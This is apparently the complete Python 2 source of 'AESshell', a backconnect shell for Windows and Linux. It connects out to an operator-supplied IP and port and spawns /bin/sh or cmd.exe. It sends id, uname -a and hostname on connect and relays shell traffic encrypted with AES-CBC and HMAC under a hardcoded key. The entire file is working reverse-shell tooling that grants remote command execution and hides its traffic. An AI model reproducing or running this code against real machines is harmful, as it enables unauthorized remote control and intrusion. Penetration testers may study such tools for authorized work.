#!/usr/bin/env python2
#

import os
import sys
import time
import hmac
import socket
import select
import Queue
import hashlib
import argparse
import threading
import subprocess
import multiprocessing

from Crypto.Cipher import AES

#unix specific
if os.name == 'posix':
	import pty

#win32 specific, lets use sys here :>
if sys.platform == 'win32':
	import msvcrt

	#pywin32
	import win32api
	import win32con
	import win32pipe
	import win32file
	import win32process
	import win32security

class AuthenticationError(Exception): pass

class Crypticle(object):
	""" PyCrypto-based authenticated symetric encryption
		http://code.activestate.com/recipes/576980/
	"""

	AES_BLOCK_SIZE = 16
	SIG_SIZE = hashlib.sha256().digest_size

	def __init__(self, key_string, key_size=192):
		self.keys = self.extract_keys(key_string, key_size)
		self.key_size = key_size

	@classmethod
	def generate_key_string(cls, key_size=192):
		key = os.urandom(key_size / 8 + cls.SIG_SIZE)
		return key.encode("base64").replace("\n", "")

	@classmethod
	def extract_keys(cls, key_string, key_size):
		key = key_string.decode("base64")
		assert len(key) == key_size / 8 + cls.SIG_SIZE, "invalid key"
		return key[:-cls.SIG_SIZE], key[-cls.SIG_SIZE:]

	def encrypt(self, data):
		"""encrypt data with AES-CBC and sign it with HMAC-SHA256"""
		aes_key, hmac_key = self.keys
		pad = self.AES_BLOCK_SIZE - len(data) % self.AES_BLOCK_SIZE
		data = data + pad * chr(pad)
		iv_bytes = os.urandom(self.AES_BLOCK_SIZE)
		cypher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)
		data = iv_bytes + cypher.encrypt(data)
		sig = hmac.new(hmac_key, data, hashlib.sha256).digest()
		return data + sig

	def decrypt(self, data):
		"""verify HMAC-SHA256 signature and decrypt data with AES-CBC"""
		aes_key, hmac_key = self.keys
		sig = data[-self.SIG_SIZE:]
		data = data[:-self.SIG_SIZE]
		if hmac.new(hmac_key, data, hashlib.sha256).digest() != sig:
			return -1
			raise AuthenticationError("message authentication failed")
		else:
			iv_bytes = data[:self.AES_BLOCK_SIZE]
			data = data[self.AES_BLOCK_SIZE:]
			cypher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)
			data = cypher.decrypt(data)
			return data[:-ord(data[-1])]

	def dumps(self, obj):
		""" argl """
		return self.encrypt(obj)

	def loads(self, obj):
		""" argl """
		data = self.decrypt(obj)
		if data == -1:
			return -1

		return self.decrypt(obj)

class winShell(object):

	def __init__ (self): 
		pass

	def ReplaceHandle(self, handle, pid):
		rHandle = win32api.DuplicateHandle( pid,\
											handle,\
											pid,\
											0,\
											0,\
											win32con.DUPLICATE_SAME_ACCESS)
		win32file.CloseHandle(handle)
		return rHandle
	
	def createProcess(self, cmdline, StartupInfo):

		res = win32process.CreateProcess( 	None,\
											cmdline,\
											None,\
											None,\
											1,\
											0,\
											None,\
											None,\
											StartupInfo)
	
		return res

	def run (self, cmdline):

		secAttrs = win32security.SECURITY_ATTRIBUTES()
		secAttrs.bInheritHandle = 1

		"""
		windows file handle redirection:
		http://wiki.wxpython.org/Capturing%20DOS%20Output%20in%20a%20wxWindow
		"""
		hStdin_r, self.hStdin_w  = win32pipe.CreatePipe(secAttrs,0)
		self.hStdout_r, hStdout_w = win32pipe.CreatePipe(secAttrs,0)
		self.hStderr_r, hStderr_w = win32pipe.CreatePipe(secAttrs,0)
		
		pid = win32api.GetCurrentProcess()

		# replace the handles
		self.hStdin_w = self.ReplaceHandle(self.hStdin_w, pid)
		self.hStdout_r = self.ReplaceHandle(self.hStdout_r, pid)
		self.hStderr_r = self.ReplaceHandle(self.hStderr_r, pid)
		
		# create the startupinformation for the process
		StartupInfo = win32process.STARTUPINFO()
		StartupInfo.hStdInput  = hStdin_r
		StartupInfo.hStdOutput = hStdout_w
		StartupInfo.hStdError  = hStderr_w
		StartupInfo.dwFlags = win32process.STARTF_USESTDHANDLES

		hProcess, hThread, dwPid, dwTid = self.createProcess(cmdline,StartupInfo)
		
		self.stdin = os.fdopen(msvcrt.open_osfhandle(self.hStdin_w, 0), "wb")
		self.stdout = os.fdopen(msvcrt.open_osfhandle(self.hStdout_r, 0), "rb")
		self.stderr = os.fdopen(msvcrt.open_osfhandle(self.hStderr_r, 0), "rb")

		baggage = [self.stdin, self.stdout, self.stderr]

		return baggage
		
	def readStdOut(self, q):
		
		while True:
			outLine = self.stdout.read(1)
			if outLine :
				q.put(outLine)			

	def readStdErr(self, q):
		while True:
			errLine = self.stderr.read(1)
			if errLine :
				q.put(errLine)			



def buildSocket(rip,rport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((rip,rport))
	except socket.error, e:
		print e[1]
		return -1
	return s

def socketLoop(rip,rport):
	i = 0
	while True:
		s = buildSocket(rip,rport)
		if s == -1:
			print "Retry..."
			time.sleep(5)
			i+=1
		elif s == -1 and i == 10:
			print "I give up."
			sys.exit(1)
		else:
			return s

def shellUnix(fdr, fdw):

	# fork it is
	pid = os.fork()
	if pid:
		return pid

	else:
		# redirect stdin/stdout/stderr to our pipes
		os.dup2(fdw[0],0)
		os.dup2(fdr[1],1)
		os.dup2(fdr[1],2) 

		# execute shell - with PTY
		pty.spawn("/bin/sh")

def checkIfChildWasExited(chld,s):
	if os.name == 'posix':
		try:
			os.kill(chld,0)
		except TypeError:
			#print "It's dead jim."
			pp = os.getppid()
			s.close()
			os.kill(pp,9)

def getAndSendData(q,ac,bc):
	if os.name != 'posix' and q.qsize()>0:
		while q.qsize>0:

			# read from the queue
			winData = q.get()

			# encrypt the data
			encStdout = ac.dumps(winData)

			# send data to the listener
			bc.send(encStdout)

			if q.qsize() == 0:
				break

def run(rip,rport,key):
	# list for filedescriptors and sockets to check
	inputs = []

	# initialize aes class
	ac = Crypticle(key)

	# first of all try to connect, give up after 10 tries
	s = socketLoop(rip,rport)
			
	# add the server to our inputs
	inputs.append(s)

	# save the socket information in the server variable
	bc = s
	cbuffer = ""

	# build up some nice pipes
	fdr = os.pipe()	
	fdw = os.pipe()


	# check the system type we are on
	stype = os.name
	if stype == 'posix':
		# thanks god  - it is a unix
		inputs.append(fdr[0])
		chld = shellUnix(fdr, fdw)
		os.write(fdw[1],'id\n')
		os.write(fdw[1],'uname -a\n')
		os.write(fdw[1],'hostname\n')

		# windows 'magic'
	elif stype == 'nt':

		# initialize winShellClass
		wS = winShell()
		baggage = wS.run("cmd.exe")

		# setup queue for windows
		q=Queue.Queue()

		# read win stdout
		tO = threading.Thread (target = wS.readStdOut, args = (q,))
		tO.daemon = True
		tO.start()

		# read win stderr
		tE = threading.Thread (target = wS.readStdErr, args = (q,))
		tE.daemon = True
		tE.start()

	while True:

		#qsize while loop
		if os.name != 'posix': getAndSendData(q,ac,bc)

		# lets call it a hack
		if os.name == 'posix': checkIfChildWasExited(chld,s)

		try:
			# on windows you cannot use select on non-socket objects
			# as a result a queue is used. read and send via another function
			# without extra process, but as select will block on windows
			# a pretty short timeout was choosen
			if os.name == 'posix':
				inputrd , outputrd , errors = select.select(inputs,[],[])
			else:
				inputrd , outputrd , errors = select.select(inputs,[],[], 0.0001)

		except select.error, e:
			print e
			break
		except socket.error, e:
			print e
			break

		for s in inputrd:

			if s == bc:

				try:
					data = s.recv(1)
					cbuffer += data
				except socket.error, e:
					print "Error: ", e
					sys.exit(1)
					
				if data == '':
					print "Disconnected"

					# is the child process still there
					if stype == 'posix':
						check = os.waitpid(chld, os.P_NOWAIT)
						if check[0] == 0:
							os.kill(chld,9)

					s.close()
					sys.exit()


			elif s == fdr[0]:
				pStdout = os.read(fdr[0],1024)

				#encrypt the data
				encStdout = ac.dumps(pStdout)

				# send data to listener
				bc.send(encStdout)

			else:
				pass

		# take the data and see if we can decrypt it
		decStdin = ac.loads(cbuffer)

		#decrypt data
		if decStdin != -1:
			cbuffer = ""

			if stype == 'posix':

				# send decrypted data to shell
				os.write(fdw[1],decStdin)
			else:
				# send command to windows file handle
				wStdin = baggage[0]
				try:
					os.write(wStdin.fileno(),decStdin)
				except OSError, e:
#					print e
					s.close()
					sys.exit(1)

	s.close()
	print "[*] Finished"

def main():
	version = '0.7.3'
	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="

	parser_description = "AESshell v%s - backconnect shell for windows and linux\n\t\tusing AES CBC Mode and HMAC-SHA256\n\t\tspring 2015 by Marco Lux <ping@curesec.com>" % version
	parser = argparse.ArgumentParser(   prog = 'AESshell backconnect (bc.py)',\
										description = parser_description,\
										formatter_class=argparse.RawTextHelpFormatter)

	parser.add_argument("-rip", action="store",dest="rip", required=True,help="Remote IP you want to connect to")
	parser.add_argument("-rport", type=int, action="store",dest="rport", required=True,help="Remote Port you want to connect to")
	
	args = parser.parse_args()
	run(args.rip, args.rport,key)

if __name__ == "__main__":
	main()
